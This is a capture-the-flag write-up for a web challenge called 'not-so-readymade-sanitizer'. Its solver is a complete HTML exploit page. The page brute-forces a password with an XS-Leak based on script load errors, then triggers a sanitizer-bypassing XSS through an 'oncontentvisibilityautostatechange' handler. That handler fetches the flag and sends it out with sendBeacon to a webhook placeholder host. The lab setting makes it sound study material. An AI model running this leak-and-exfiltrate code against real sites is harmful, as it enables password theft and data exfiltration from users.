# [web] - [not-so-readymade-sanitizer]

## Author
nyxmare

## Description
So, i made a sanitizer app again, pretty sure its secure now

## Overview & Solution

- xsleak error events
- 0day xss bypass

### Solver

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<script>

    const webhook = "webhook";
    const hostname = "not-so-readymade-sanitizer-web";
    window.open(`http://${hostname}/idk`)

    const leak = async (url) => {
        return new Promise((r) => {
            let s = document.createElement('script')
            s.src = url
            s.onload = (e) => {
                e.target.remove()
                return r(1)
            }
            s.onerror = (e) => {
                e.target.remove()
                return r(0)
            }
            document.head.appendChild(s)
        })
    }

    let log = (msg) => {
        console.log(msg)
        navigator.sendBeacon(`http://${webhook}/log`, msg)
    }

    let chars = "0123456789abcdef";
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    async function main() {
        let known = '';
        let found;
        log('init')

        do {
            found = false;
            for (const c of chars) {
                const candidate = known + c;
                const param = encodeURIComponent(candidate + '%');
                const url = `http://${hostname}/search.php?password=${param}`;
                const res = await leak(url);
                if (res) {
                    known = candidate;
                    log(`found ${known}`)
                    found = true;
                    break;
                }

                // await sleep(300);

            }
        } while (found);

        log(`Password: ${known}`);

        let a = `
        fetch('/flag.php').then((r)=>{r.text().then((r)=>{navigator.sendBeacon('http://${webhook}/', r)})})
        `

        window.name = a


        window.open(`http://${hostname}/index.php?password=${known}&html=<xss id=">" oncontentvisibilityautostatechange=eval(name) style=display:block;content-visibility:auto>`, a)
    }

    main()
</script>
</body>
</html>

```


## Flag
`CJ{bro_is_solving_0day_challenge_on_ADOdb_GG}`
